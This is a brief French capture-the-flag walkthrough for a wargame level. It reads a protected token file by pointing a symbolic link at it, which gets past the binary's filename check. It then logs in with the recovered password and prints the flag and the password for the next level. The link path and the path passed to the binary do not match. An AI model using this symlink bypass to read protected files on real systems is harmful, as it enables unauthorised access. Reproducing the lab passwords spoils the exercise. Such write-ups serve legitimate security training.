## 1. Analyser le fichier binaire level08

    ./level08 [file to read]

Attend un fichier en arg, mais nous n'avons pas l'autorisation d'ouvrir le fichier token.

## 2. Lien symbolique

    ln -s /home/user/level08/token /tmp/token

    ./level08 /tmp/test
    Cela affiche: quif5eloekouj29ke0vouxean

## 3. Connexion

su flag08

    Mot de passe : quif5eloekouj29ke0vouxean
    Commande pour obtenir le flag : getflag
    Résultat : 25749xKZ8L7DkSCwJkT9dyv6f

su level09

    Mot de passe : 25749xKZ8L7DkSCwJkT9dyv6f